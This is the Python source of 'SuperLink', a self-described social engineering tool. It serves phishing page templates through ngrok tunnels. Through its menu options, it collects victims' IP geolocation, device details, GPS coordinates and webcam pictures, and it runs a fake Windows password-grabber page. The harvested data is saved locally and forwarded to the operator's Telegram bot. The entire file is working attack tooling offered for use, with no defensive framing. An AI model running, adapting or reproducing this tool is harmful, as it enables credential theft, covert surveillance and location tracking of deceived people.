from argparse import ArgumentParser
from json import loads
from os import getcwd, listdir, name, remove, stat, system
from pathlib import Path
from platform import uname
from random import choice
from subprocess import Popen
from sys import exit, version_info
from time import sleep

from colorama import Fore, init
from pyngrok import conf, ngrok

from Modules.checkConfig import CheckConfigFile
from Modules.checkUpdates import CheckUpdates
from Modules.clearData import DeleteFilesAndDirs
from Modules.data2image import Data2Image
from Modules.downloadUpdate import GetNewUpdate
from Modules.editIndexFile import EditIndexFile
from Modules.geocodingAPI import Geocoding
from Modules.geoip import GeolocationIP
from Modules.loadTemplates import loadTemplatePath
from Modules.mapMaker import MapMaker
from Modules.notifier import TelegramBot
from Modules.timeOptions import TimeOptions

if name == "nt":
    try:
        from win10toast import ToastNotifier
    except ModuleNotFoundError:
        print(
            "\n[!] Please install (win10toast) module with\npip install win10toast==0.9")
        exit()

LG = Fore.LIGHTGREEN_EX  # light green
LR = Fore.LIGHTRED_EX  # light red
LY = Fore.LIGHTYELLOW_EX  # light yellow
LW = Fore.LIGHTWHITE_EX  # light white
LC = Fore.LIGHTCYAN_EX  # light cyan
LB = Fore.LIGHTBLUE_EX  # light blue
Y = Fore.YELLOW  # yellow
COLORS = [
    LG,
    LR,
    LY,
    LW,
    LC,
    LB,
    Y
]

parser = ArgumentParser()
parser.add_argument("-p", "--port",
                    type=int, default=9090,
                    help="The port for PHP server & ngrok tunnel [ Default : 9090 ]")
args = parser.parse_args()
PORT = args.port

__author__ = "IHosseini"
__version__ = "1.4.5"

script_title = f"SuperLink - v{__version__} - By {__author__}"


def check_py_version():
    py_version = version_info
    if py_version[0] >= 3:
        if py_version[1] < 8:
            print(
                LR + "[!] This script requires at least python3.8 to work fine!")
            exit()
    else:
        print(f'{LR}[!] This script only works for Python3 or later!')
        exit()


def win10_notify(
        title: str,
        msg: str,
        icon: str = None,
        duration: int = 5,
        threaded: bool = False):
    sys_info = uname()
    user_system = sys_info[0]
    system_release = sys_info[2]
    if (
        user_system != "Windows" or system_release == "10"
    ) and user_system == "Windows":
        notify = ToastNotifier()
        notify.show_toast(title, msg, icon, duration, threaded)


def superlink_art():
    art = rf"""
    ____                    __   _      __  
   / __/_ _____  ___ ____  / /  (_)__  / /__ ©
  _\ \/ // / _ \/ -_) __/ / /__/ / _ \/  '_/
 /___/\_,_/ .__/\__/_/   /____/_/_//_/_/\_\ 
         /_/            
                             
 v{__version__}
 Social Engineering Tool By {__author__}.
    """
    for line in art.splitlines():
        color = choice(COLORS)
        print(color + line)


def tm_settitle(title: str):
    if name == "nt":
        system(f"title {title}")


def tm_cleaner():
    system("cls" if name == "nt" else "clear")


def banner():
    tm_settitle(script_title)
    tm_cleaner()
    superlink_art()


def list_files(dir_path: str = None):
    if dir_path is None:
        files = listdir(".")
        for num_files, file in enumerate(files, start=1):
            print(f" {num_files} --> {file}")
    else:
        files = listdir(dir_path)
        if len(files) != 0:
            for num_files, file in enumerate(files, start=1):
                print(f" {num_files} --> {file}")
        else:
            print(" [>] There is no file to show!")


def make_dirs():
    Path("./Logs/PHP-Log").mkdir(parents=True, exist_ok=True)
    Path("./Logs/Saved-IP").mkdir(parents=True, exist_ok=True)
    Path("./Logs/Saved-Info").mkdir(parents=True, exist_ok=True)
    Path("./Target-Data").mkdir(parents=True, exist_ok=True)
    Path("./Webcam-Images").mkdir(parents=True, exist_ok=True)


def current_working_dir():
    cwd = getcwd()
    user_system = uname()[0]
    cwd = cwd.split("/")[-1] if user_system != "Windows" else cwd.split("\\")[-1]
    if cwd == "/":
        cwd = ""
    return cwd


def press_enter():
    input("\n\n" + LG + " [" + LR + "!" + LG + "]" + LW +
          " Press [" + LR + "ENTER" + LW + "] to continue... ")


def get_link():
    username = uname()[1]
    cwd = current_working_dir()
    banner()
    sleep(0.1)
    print("\n" + LG + " [" + LR + "!" + LG + "]" + LW +
          " Press [" + LB + "Ctrl+C" + LW + "] to exit.")
    sleep(0.1)
    print("\n\n" + LG + " [" + LR + "!" + LG + "]" +
          LB + " Please enter the URL.")
    redirect_link = input("\n" + LG + " ┌─(" + LC + f"{username}" + LR + "@" +
                          LC + "SuperLink" + LG + ")─[" + LC + f"./{cwd}" + LG + "]" + """
 └──╼/# """ + LW + "")
    if len(redirect_link) == 0:
        return None
    proto_li = ["http://", "https://"]
    for p in proto_li:
        redirect_link = redirect_link.replace(p, "")
    return redirect_link


def home_options():
    banner()
    sleep(0.1)
    print("\n" + LG + " [" + LR + "!" + LG + "]" + LW +
          " Press [" + LB + "Ctrl+C" + LW + "] to exit.")
    sleep(0.1)
    print("\n\n" + LG + " [" + LR + "01" + LG + "]" +
          LB + " Get target GeoIP and Sys info")
    sleep(0.1)
    print(
        (
            f'{LG} [{LR}02{LG}]{LB}'
            + " Get target location data (Lat, Long, Speed, ....)"
        )
    )

    sleep(0.1)
    print(((f'{LG} [{LR}03{LG}]' + LB) + " Redirect target to another URL"))
    sleep(0.1)
    print(((f'{LG} [{LR}04{LG}]' + LB) + " Webcam access & take a picture"))
    sleep(0.1)
    print((f'{LG} [{LR}05{LG}]{LB}' + " OS password grabber (only Win10)"))
    sleep(0.1)
    print(((f'{LG} [{LR}06{LG}]' + LB) + " Show all targets data files"))
    sleep(0.1)
    print(
        (
            f'{LG} [{LR}07{LG}]{LB}'
            + " Wipe out all previous targets data (IMG & TXT)"
        )
    )

    sleep(0.1)
    print(((f'{LG} [{LR}08{LG}]' + LB) + " Check for available updates!\n"))
    sleep(0.1)
    print(f'{LG} [{LR}99{LG}]{LY}' + " Quit :(\n")
    sleep(0.1)


def start():
    icons_path = "./Modules/icons/"
    username = uname()[1]
    cwd = current_working_dir()
    _del_ = DeleteFilesAndDirs()
    t_print = TmPrint()
    check_updates()
    while True:
        try:
            init()
            make_dirs()
            home_options()
            opt = str(input("\n" + LG + " ┌─(" + LC + f"{username}" + LR + "@" +
                            LC + "SuperLink" + LG + ")─[" + LC + f"~/{cwd}" + LG + "]" + """
 └──╼/$ """ + LW + ""))
            temps = loadTemplatePath()
            if not opt:
                continue
            elif opt == "01":
                EditIndexFile(temps.loadPath("1")).ChangeToGetDataFile()
                MainServer(temps.loadPath("1")).create_data_link()
            elif opt == "02":
                MainServer(temps.loadPath("4")).create_data_link()
            elif opt == "03":
                rd_link = get_link()
                if rd_link is None:
                    print("\n" + LG + " [" + LR + "!" + LG +
                          "]" + LY + " Have not entered any URL!")
                    press_enter()
                else:
                    EditIndexFile(temps.loadPath("1"),
                                  redir_link=rd_link).ChangeToRedirFile()
                    MainServer(temps.loadPath("1")).create_data_link()
            elif opt == "04":
                MainServer(temps.loadPath("2")).create_data_link()
            elif opt == "05":
                MainServer(temps.loadPath("3")).create_data_link()
            elif opt == "06":
                print("\n" + LC + " [>] Data Files: \n" + LY)
                list_files("./Target-Data")
                print("\n" + LC + " [>] Webcam IMG Files: \n" + LY)
                list_files("./Webcam-Images")
                press_enter()
            elif opt == "07":
                banner()
                print("\n")
                t_print.out(f'{LG} [>] Deleting targets files... ')
                sleep(3)
                _del_.deleteAllFilesByType("txt", "./Target-Data")
                _del_.deleteAllFilesByType("png", "./Target-Data")
                _del_.deleteAllFilesByType("png", "./Webcam-Images")
                t_print.out(f'{LG} [>] Targets files deleted successfully! ')
                win10_notify(
                    "Files deleted!",
                    "All of the targets files (TXT & IMG) have been successfully deleted!",
                    icon=f'{icons_path}trash_empty.ico',
                )

                press_enter()
                continue
            elif opt == "08":
                check_updates()
            elif opt == "99":
                tm_cleaner()
                break
            else:
                print("\n" + LG + " [" + LR + "!" + LG + "]" + LY +
                      " Your entry is not available in the options!")
                press_enter()
        except Exception as error:
            print("\n\n" + LR + " [#start] ERROR : " + str(error))
            press_enter()
            tm_cleaner()
            break
        except KeyboardInterrupt:
            tm_cleaner()
            break


def check_updates():
    t_print = TmPrint()
    updater = CheckUpdates()
    up_downloader = GetNewUpdate()
    try:
        banner()
        print("\n\n")
        t_print.out(f'{LG} [>] Checking for new update...')
        if updater.new_update is False:
            t_print.out(f'{LG} [>] Everything is up-to-date!')
            win10_notify("Up-To-Date!", "Everything has been checked and there is not any new update!",
                         icon="./Modules/icons/green_check.ico")
        elif updater.new_update is None:
            t_print.out(f'{LY} [!] Something went wrong!!!')
            win10_notify("Something went wrong!",
                         "Something unknown happened while checking for new update!\n"
                         "please check your network connection.",
                         icon="./Modules/icons/red_cross.ico")
        else:
            t_print.out(
                (
                    (
                        (
                            (f'{LY} [!] New update available! (' + LR)
                            + f"v{updater.new_update[0]}"
                        )
                        + LY
                    )
                    + f") #{updater.new_update[1]}"
                )
            )

            win10_notify("New update available!",
                         f"A new update released on github by the author\nnew version: {updater.new_update[0]}",
                         icon="./Modules/icons/exclamation_mark.ico")
            up_file = f"SuperLink-v{updater.new_update[0]}.zip"
            select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" +
                                LB + f" Do you want to download the new version ({updater.new_update[0]}) ? [y/n] " +
                                LW + "").lower()
            if select_down in ["y", "yes"]:
                banner()
                print("\n\n")
                t_print.out(
                    LG + f" [>] Downloading new version ({updater.new_update[0]}) ...")
                try:
                    up_downloader.download(f"../{up_file}")
                    t_print.out(f"{LG} [>] Downloaded successfully!")
                    win10_notify("Update files downloaded!",
                                 "New update files successfully downloaded and gonna be extracted soon!",
                                 icon="./Modules/icons/download_folder.ico")
                    t_print.out(
                        LG + f" [>] Extracting new update file ({up_file})...")
                    sleep(2)
                    up_downloader.extract(
                        f"../{up_file}", path=f"../{up_file}".replace(".zip", ""))
                    t_print.out(
                        (
                            LG
                            + " [>] Update file successfully extracted in "
                            + LW
                        )
                        + f"[../{up_file}]".replace(".zip", "")
                    )

                    remove(f"../{up_file}")
                except Exception as _:
                    t_print.out(f"{LR} [>] Something went wrong while updating!")
                press_enter()
    except KeyboardInterrupt:
        exit()


class TmPrint:
    def __init__(self):
        self.max_len = 0

    def out(self, text):
        if len(text) > self.max_len:
            self.max_len = len(text)
        else:
            text += (" " * (self.max_len - len(text)))
        print(text, end='\r')


class MainServer:
    def __init__(self, template_path, proto=None):
        self.conf_file = CheckConfigFile()
        self.def_port = PORT
        self.def_proto = "http"
        self.template_path = template_path
        self.proto = proto
        self.ngrok_auth_token = self.conf_file.load_token
        self.ngrok_region = self.conf_file.load_region
        self.user_chat_id = self.conf_file.load_chat_id
        self.tele_bot = TelegramBot(self.user_chat_id)
        self.t_print = TmPrint()
        self.time_opt = TimeOptions()
        self.geocoding = Geocoding()
        self.maper = MapMaker()

    def create_data_link(self):
        banner()
        icons_path = "./Modules/icons/"
        print("\n\n")
        self.t_print.out(f'{LG} [>] Processing...')
        sleep(1)
        template_name = self.template_path.split("/")[2]
        self.t_print.out(f'{LG} [>] Checking port & protocol...')
        sleep(1)
        proto = self.def_proto if self.proto is None else self.proto
        try:
            self.t_print.out(
                f'{LG} [>] Starting PHP server on port{LW}' + f" ({self.def_port})"
            )

            sleep(1)
            with open("./Logs/PHP-Log/PHP_SERVER_LOG.log", "w", encoding="UTF-8") as php_log:
                Popen(("php", "-S", f"localhost:{self.def_port}", "-t", self.template_path),
                      stderr=php_log, stdout=php_log)
                self.t_print.out(f'{LG} [>] Generating the link...')
                conf.get_default().region = self.ngrok_region
                conf.get_default().auth_token = self.ngrok_auth_token
                link = ngrok.connect(self.def_port, proto).public_url
                link = str(link).replace("http://", "https://")
                local_mode = f"http://localhost:{self.def_port}"
                self.t_print.out(f'{LG} [>] All done!')
                win10_notify(
                    "Server started!",
                    f"PHP & Ngrok server successfully started on port ({self.def_port})",
                    icon=f'{icons_path}green_check.ico',
                )

                self.t_print.out(f'{LG} [>] Template Name : {LW}{template_name}')
                sleep(0.4)
                print("\n\n" + LG + " [>] Your Link : " + LW + link)
                sleep(0.4)
                print("\n" + LG + " [>] Localhost Mode : " +
                      LW + local_mode + "\n")
                sleep(0.4)
                self.t_print.out(f'{LG} [>] Sending the link to your{LW} telegram{LG} ... ')
                try:
                    self.tele_bot.sendMessage(
                        f"✅ New link created!\n\n🌐 Template name : {template_name}\n🔗 Link : {link}" +
                        f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
                    self.t_print.out(
                        f'{LG} [>] The link have been sent to your {LW}telegram{LG}'
                        + " successfully!\n"
                    )

                except Exception as _:
                    self.t_print.out(
                        (
                            (
                                (
                                    (
                                        f'{LR} [>]{LY} Failed to send the link to your '
                                        + LW
                                    )
                                    + "telegram "
                                )
                                + LY
                            )
                            + "!"
                        )
                    )

                    print("")
                print(LR + "\n --------------------------------- \n")
                print(
                    (
                        (
                            (
                                (
                                    (
                                        (
                                            (
                                                (
                                                    f'{LG} [!] You can close the server by pressing'
                                                    + LW
                                                )
                                                + " ["
                                            )
                                            + LR
                                        )
                                        + "Ctrl+C"
                                    )
                                    + LW
                                )
                                + "]"
                            )
                            + LG
                        )
                        + " ... \n"
                    )
                )

                self.get_user_data()
        except Exception as error:
            print("\n\n" + LR + " [#MainServer] ERROR : " + str(error))
            self.tele_bot.sendMessage(f"❌ Link expired! (Server error)\n\n🌐 Template name : {template_name}" +
                                      f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
            self.kill_php_ngrok()
        except KeyboardInterrupt:
            self.tele_bot.sendMessage(f"❌ Link expired! (Closed server)\n\n🌐 Template name : {template_name}" +
                                      f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
            self.kill_php_ngrok()

    @staticmethod
    def kill_php_ngrok():
        press_enter()
        tm_cleaner()
        if name == "nt":
            with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
                Popen(("taskkill", "/F", "/IM", "php*"),
                      stdout=kill_process, stderr=kill_process)
        else:
            with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
                Popen(("pkill", "php"), stdout=kill_process, stderr=kill_process)
        ngrok.kill()
        exit()

    @staticmethod
    def get_ip_addr():
        file_path_ip = "./Logs/Saved-IP/IP-Address.txt"
        if stat(file_path_ip).st_size == 0:
            return None
        with open(file_path_ip, "r", encoding="UTF-8") as ip_file:
            file_lines = ip_file.readlines()
            target_ip = file_lines[-1]
        return target_ip

    def get_user_data(self):
        template_name = self.template_path.split("/")[2]
        icons_path = "./Modules/icons/"
        temp_path_li = ["./Templates/Music Player", "./Templates/Smiling Moon",
                        "./Templates/NearYou", "./Templates/Camera (Webcam access)",
                        "./Templates/Password grabber (Win10)",
                        "./Templates/Weather forecast"]
        t_print = TmPrint()
        number_of_target = 1
        file_path_info = "./Logs/Saved-Info/Info.json"
        file_path_ip = "./Logs/Saved-IP/IP-Address.txt"
        file_path_loc = "./Logs/Saved-Info/Loc-Info.json"
        while True:
            try:
                target_ip = self.get_ip_addr()
                if target_ip is not None:
                    win10_notify(
                        "Target detected!", "New target opened the link!", icons_path + "devilish_earth.ico")
                    target_data_file = f"./Target-Data/{self.time_opt.calendar}_T{number_of_target}.txt"
                    if "149.154" in target_ip:
                        pass
                    else:
                        t_print.out(LY + " <! " + LB + "-----" + LY +
                                    f" {number_of_target} " + LB + "-----" + LY + " !> ")
                        print(LG + f"\n\n [>] IP   : " + LW + f"{target_ip}" +
                              LG + " [>] Time : " + LW + f"{self.time_opt.calendar} | {self.time_opt.clock}")
                        with open(file_path_ip, "w", encoding="UTF-8") as clean_ip_file:
                            clean_ip_file.write("")
                    t_print.out(LG + " [>] Saving target GeoIP data... ")
                    sleep(2)
                    if stat(file_path_info).st_size != 0:
                        with open(file_path_info, "r", encoding="UTF-8") as info_file:
                            info_content = info_file.read()
                        info_data = loads(info_content)["info"]
                        ip = GeolocationIP(target_ip)
                        ip = ip.get_data
                        full_target_data = implement_userdata(info_data, ip)
                        with open(target_data_file, "w", encoding="UTF-8") as target_info:
                            target_info.write(full_target_data)
                        t_print.out(LG + f" [>] Target GeoIP data successfully saved in" +
                                    LW + f" [{target_data_file}]" + LG + " &" +
                                    LW + f" [./Target-Data/IMG_T{number_of_target}.png]")
                        print("")
                    else:
                        t_print.out(
                            LG + " [>] Target GeoIP data could not be saved!")
                        print("")
                    if self.template_path == temp_path_li[3]:
                        print(
                            LG + " [>] New images will be available in " + LW + "[./Webcam-Images]")
                    elif self.template_path == temp_path_li[-2]:
                        print(LG + " [>] If you catch any passwords, they will be in " +
                              LW + f"[./Target-Data/{self.time_opt.calendar}_PASSWORDS.txt]")
                    elif self.template_path == temp_path_li[-1]:
                        if stat(file_path_loc).st_size != 0:
                            t_print.out(
                                LG + " [>] Saving target Location data... ")
                            sleep(2)
                            with open(file_path_loc, "r", encoding="UTF-8") as loc_file:
                                loc_content = loc_file.read()
                            loc_data = loads(loc_content)["loc_info"]
                            latitude = loc_data["latitude"]
                            longitude = loc_data["longitude"]
                            accuracy = loc_data["accuracy"]
                            altitude = loc_data["altitude"]
                            direction = loc_data["direction"]
                            speed = loc_data["speed"]
                            address = self.geocoding.reverse(
                                latitude, longitude)
                            with open(target_data_file, "a", encoding="UTF-8") as target_info:
                                target_info.write("\n\n[------ Location Info ------] \n\n" +
                                                  f"-> Latitude : {latitude}\n-> Longitude : {longitude}\n" +
                                                  f"-> Altitude : {altitude}\n-> Speed : {speed}\n" +
                                                  f"-> Direction : {direction}\n-> Accuracy : {accuracy}\n" +
                                                  f"-> Google Maps Link : google.com/maps/place/{latitude}+{longitude}\n")
                                if "message" not in address:
                                    address = address["display_name"]
                                    target_info.write(
                                        f"-> Human-Readable Address: {address}")
                                    self.maper.popup(f"<b>{address}</b>")
                                    self.maper.zoom_start(13)
                                    self.maper.tooltip(f"<b>{target_ip}</b><br>[CLICK FOR INFO]")
                                    self.maper.generate([longitude, latitude],
                                                        marker=True, save_to_index=True,
                                                        index_name=f"./Target-Data/{self.time_opt.calendar}_T{number_of_target}_Location.html")
                                with open(file_path_loc, "w", encoding="UTF-8") as loc_file:
                                    loc_file.write("")
                                t_print.out(LG + " [>] Target Location data successfully appended to " +
                                            LW + f"[{target_data_file}]")
                                print("")
                        else:
                            t_print.out(LR + " [>]" +
                                        LY + " Target " + LW + "Location data" +
                                        LY + " could not be saved!")
                            print("")
                    else:
                        continue
                    try:
                        t_print.out(
                            LG + " [>] Sending target data to your" + LW + " telegram" + LG + " ...")
                        with open(target_data_file, "r", encoding="UTF-8") as data:
                            image_data = Data2Image(
                                f"./Target-Data/IMG_T{number_of_target}.png")
                            image_data.write_image(data.read().replace("------", ""), "./Modules/fonts/arial.ttf",
                                                   25, "RGB", (1024,
                                                               1024), (250, 97, 97),
                                                   (255, 255, 255))
                            self.tele_bot.sendDocument(target_data_file,
                                                       caption=f"*Target Number*: `{number_of_target}`\n" +
                                                               f"*Template name*: `{template_name}`\n"
                                                               f"*Time*: {self.time_opt.calendar} {self.time_opt.clock}",
                                                       parse_mode="Markdown")
                        t_print.out(
                            LG + " [>] Data file successfully sent to your" + LW + " telegram" + LG + " !")
                        print("")
                    except Exception as _:
                        t_print.out(LR + " [>]" + LY + " Failed to send the target data to your " +
                                    LW + "telegram " + LY + "! (check your connection)")
                        print("")
                    win10_notify("Data successfully saved!", f"Target data successfully saved in [{target_data_file}]",
                                 icon=icons_path + "download_folder.ico")
                    print("")
                    t_print.out(LG + " [>] " + LC + "Waiting for other " + LR + "targets" +
                                LC + " interaction... ")
                    number_of_target += 1
                else:
                    continue
            except Exception as error:
                print("\n\n" + LR + " [#getUserData] ERROR : " + str(error))
                self.kill_php_ngrok()
            except KeyboardInterrupt:
                self.tele_bot.sendMessage(f"❌ Link expired! (Closed server)\n\n🌐 Template name : {template_name}" +
                                          f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
                self.kill_php_ngrok()


def implement_userdata(info_data: dict, ip: dict):
    full_target_data = "[------ GeolocationIP Info ------] \n\n" \
                       f"-> IP : {ip['ip']}\n-> City : {ip['city']}\n" \
                       f"-> Region : {ip['region']}\n-> Country : {ip['country']}\n" \
                       f"-> Location : {ip['location']}\n-> ASN : {ip['asn']}\n" \
                       f"-> Post Code : {ip['postal']}\n-> Time Zone : {ip['time_zone']}\n" \
                       "\n[------ System Info ------] \n\n" \
                       f"-> OS Name : {info_data['OS-Name']}\n-> OS Version : {info_data['OS-Version']}\n" \
                       f"-> Browser : {info_data['Browser-Name']} {info_data['Browser-Version']}\n" \
                       f"-> Device : {info_data['Device-Name']}\n-> Device-Memory : {info_data['Device-Memory']}\n" \
                       f"-> CPU Architecture : {info_data['CPU-Architecture']}\n" \
                       f"-> Number Of CPU Cores : {info_data['CPU-Cores']}\n" \
                       f"-> Screen Resolution : {info_data['Device-Resolution']}\n" \
                       f"-> Time Zone : {info_data['Time-Zone']}\n-> Language : {info_data['User-Language']}\n" \
                       f"-> User-Agent : {info_data['User-Agent']}"
    return full_target_data


if __name__ == "__main__":
    check_py_version()
    start()
